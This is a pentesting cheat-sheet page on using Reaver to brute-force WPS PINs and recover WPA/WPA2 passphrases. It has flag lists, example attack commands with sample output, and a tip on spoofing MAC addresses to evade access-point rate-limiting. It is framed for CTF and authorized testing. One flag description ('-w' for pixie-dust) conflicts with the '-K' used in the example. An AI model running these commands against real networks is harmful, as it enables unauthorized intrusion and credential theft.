#### Official Documentation: [https://www.kali.org/tools/reaver/](https://www.kali.org/tools/reaver/)
#### Cheat Sheet: [[Kali Tools#Reaver|Reaver Commands]]
## Purpose
Reaver attacks Wi-Fi Protected Setup (WPS) to recover the WPA/WPA2 passphrase by exploiting weak WPS PIN implementations (brute-forcing PINs).

## Scenarios
- CTF: If a target AP has WPS enabled, use Reaver to brute-force the WPS PIN and recover the PSK.  
- Real world: Demonstrate poor WPS security on lab devices or client systems where WPS is enabled (authorized testing only).

## All needed info to run
- Target AP must have WPS enabled and be in range. WPS is increasingly disabled on modern routers.  
- Requires monitor mode adapter and capture tools (often used alongside `airodump-ng` for targeting).  
- Common Reaver flags:
  - `-i <mon_iface>` → monitor interface  
  - `-b <BSSID>` → target AP BSSID  
  - `-c <channel>` → channel  
  - `-vv` → very verbose  
  - `-w` → enable WPS pixie-dust attacks (some versions)  
  - `--mac=<mac>` → spoof MAC address if needed  
- Reaver is slow (tens of thousands of PIN attempts) unless vulnerabilities like pixie-dust exist.

## Example commands & outputs
```bash
# Run Reaver against target BSSID on channel 6 using mon0
$ sudo reaver -i mon0 -b 00:11:22:33:44:55 -c 6 -vv
# Output snippet:
# Waiting for beacon from 00:11:22:33:44:55
# Trying pin 12345670
# [!] 1/11000: Received M7 timeout
# PIN found: '12345670'
# WPA PSK: examplepassword

# Use pixie-dust (if supported and vulnerable)
$ sudo reaver -i mon0 -b 00:11:22:33:44:55 -c 6 -K 1 -vv
# Output: shows pixie-dust attack results and possibly instant PIN recovery
```

!!! note "Reaver Basics"
	- Reaver targets WPS — many modern routers disable WPS; check before running.
	- Reaver can take a long time (hours to days) without vulnerabilities like pixie-dust.
	- Use `--mac` to rotate or spoof MAC to avoid AP rate-limiting or blocks.
	- Always have written authorization — brute forcing wireless devices is intrusive.

### [[Kali Tools#Reaver|Reaver Commands]]